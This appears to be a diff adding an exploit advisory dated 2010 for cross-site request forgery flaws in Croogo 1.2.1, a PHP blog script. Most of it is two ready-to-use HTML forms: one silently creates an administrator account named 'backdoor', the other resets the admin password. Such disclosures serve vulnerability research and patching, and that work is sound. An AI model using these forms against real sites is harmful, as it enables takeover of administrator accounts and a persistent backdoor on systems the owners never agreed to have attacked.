@@ -1,0 +1,54 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Croogo 1.2.1 Multiple CSRF Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail[dot]com
+[#] Date: 07. February 2010.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Croogo
+[#] Version: 1.2.1
+[#] Platform: PHP
+[#] Site: http://www.croogo.org
+[#] Download: http://croogo.googlecode.com/files/croogo-1.2.1.zip
+[#] Vulnerability: Cross Site Request Forgery
+[#-----------------------------------------------------------------------------------------------#]
+
+Croogo blog script lacks of cross site request forgery protection,
+allowing us to make exploit to add new admin user or change existing
+admin password.
+
+[#]Content
+ |--CSRF
+    |--Add Administrator
+    |--Change Administrators Password
+
+[*] Add Administrator
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="/localhost/cro/admin/users/add" method="post">
+  <input type="hidden" name="_method" value="POST"/>
+  <input type="hidden" name="data[User][role_id]" value="1"/>
+  <input type="hidden" name="data[User][username]" value="backdoor"/>
+  <input type="hidden" name="data[User][password]" value="hacked"/>
+  <input type="hidden" name="data[User][name]" value="thisismyname"/>
+  <input type="hidden" name="data[User][email]" value="my@mail.com"/>
+  <input type="hidden" name="data[User][website]" value="website"/>
+  <input type="hidden" name="data[User][status]" value="1"/>
+  <input type="submit" name="submit" value="Submit"/>
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[*] Change Administrators Password
+
+In this exploit 1 is the ID of the admin user that we want to edit.
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="/localhost/cro/admin/users/reset_password/1" method="post">
+  <input type="hidden" name="_method" value="PUT"/>
+  <input type="hidden" name="data[User][id]" value="1"/>
+  <input type="hidden" name="data[User][username]" value="admin"/>
+  <input type="hidden" name="data[User][password]" value="hacked"/>
+  <input type="submit" name="submit" value="Submit"/>
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#]EOF
